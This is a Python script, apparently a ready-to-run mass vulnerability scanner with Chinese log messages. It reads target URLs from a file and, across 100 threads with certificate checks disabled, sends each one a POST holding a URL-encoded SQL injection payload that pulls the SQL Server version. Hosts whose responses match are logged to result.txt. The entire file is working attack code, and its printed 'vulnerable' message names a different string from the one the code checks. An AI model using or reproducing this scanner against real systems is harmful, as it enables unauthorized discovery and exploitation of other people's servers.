import requests
import threading
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

file_lock = threading.Lock()

def check_vulnerability(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/4.0(compatible:ISIE 8.0:Windows NT 6.1)',
            'Accept-Encoding': 'gzip,deflate',
            'Accept': '*/*',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        parsed_url = urlparse(url)
        host = parsed_url.netloc
        headers['Host'] = host
        data = 'action=getType&Typeid=%2d%31%2f%40%40%56%45%52%53%49%4f%4e'
        response = requests.post(
            url,
            headers=headers,
            data=data,
            verify=False,
            allow_redirects=False,
            timeout=10
        )
        if 300 <= response.status_code < 400:
            print(f"[INFO] {url} - 状态码 {response.status_code}，不存在漏洞")
            return False, url, response.status_code
        
        elif response.status_code == 200:
            if 'MicrosoftSQL Server' in response.text:
                result = f"[VULNERABLE] {url} - 状态码 200，响应包含 'Microsoft Corporation'，漏洞存在！"
                print(result)
                with file_lock:
                    with open('result.txt', 'a', encoding='utf-8') as f:
                        f.write(result + '\n')
                return True, url, response.status_code
            else:
                print(f"[INFO] {url} - 状态码 200，但响应不包含目标字符串，不存在漏洞")
                return False, url, response.status_code
        else:
            print(f"[INFO] {url} - 状态码 {response.status_code}，不存在漏洞")
            return False, url, response.status_code
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
        return False, url, 'Error'
    except Exception as e:
        print(f"[ERROR] {url} - 发生异常: {str(e)}")
        return False, url, 'Exception'

def main():
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 未找到 url.txt 文件")
        return
    except Exception as e:
        print(f"[ERROR] 读取文件失败: {str(e)}")
        return
    
    if not urls:
        print("[INFO] url.txt 文件中没有有效的URL")
        return
    
    print(f"[INFO] 开始检测 {len(urls)} 个URL，线程数: 100")
    open('result.txt', 'w').close()

    vulnerable_count = 0
    with ThreadPoolExecutor(max_workers=100) as executor:
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                is_vulnerable, checked_url, status_code = future.result()
                if is_vulnerable:
                    vulnerable_count += 1
            except Exception as e:
                print(f"[ERROR] 处理 {url} 时发生异常: {str(e)}")
    
    print(f"\n[INFO] 检测完成！共发现 {vulnerable_count} 个存在漏洞的URL")
    print(f"[INFO] 漏洞详情已写入 result.txt 文件")

if __name__ == "__main__":
    main()